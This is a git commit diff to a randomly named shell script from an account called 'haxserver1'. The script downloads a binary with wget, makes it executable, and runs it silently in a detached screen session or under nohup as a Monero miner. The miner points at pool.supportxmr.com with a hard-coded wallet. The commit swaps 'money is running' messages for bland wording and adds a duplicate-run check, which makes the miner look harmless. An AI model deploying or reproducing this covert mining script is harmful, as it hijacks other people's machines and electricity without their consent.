18f841a786674e0516f33c89bf7d8a5dd350df80
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-02 09:00:00 +0800

    Update sj17yu23b7db19sn20nf721b7sb2.sh v3

--- sj17yu23b7db19sn20nf721b7sb2.sh
+++ sj17yu23b7db19sn20nf721b7sb2.sh
@@ -6,7 +6,6 @@ FILE_NAME="session_ajqysbey"
 wget -O $FILE_NAME $FILE_URL
 chmod +x $FILE_NAME 
 
-
 # Command to run
 COMMAND="./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx"
 
@@ -16,24 +15,23 @@ SESSION_NAME=$(basename "$FILE_NAME")
 # Check if screen is installed
 if command -v screen &> /dev/null
 then
-    # Run the file in a screen session
-    screen -dmS $SESSION_NAME $COMMAND
-    sleep 1
     # Check if the screen session is running
     if screen -list | grep -q "$SESSION_NAME"; then
-        echo "money is running in screen"
+        echo "You already executed the command in a screen session."
     else
-        echo "error"
+        # Run the file in a screen session
+        screen -dmS $SESSION_NAME $COMMAND
+        sleep 1
+        echo "Command executed in a new screen session."
     fi
 else
-    # Run the file in the background using nohup
-    nohup $COMMAND &> /dev/null &
-    PID=$!
-    sleep 1
-    # Check if the process is running
-    if ps -p $PID > /dev/null; then
-        echo "money is running in the background"
+    # Check if the process is running in the background
+    if pgrep -f "$COMMAND" > /dev/null; then
+        echo "You already executed the command in the background."
     else
-        echo "error"
+        # Run the file in the background using nohup
+        nohup $COMMAND &> /dev/null &
+        sleep 1
+        echo "Command executed in the background."
     fi
 fi
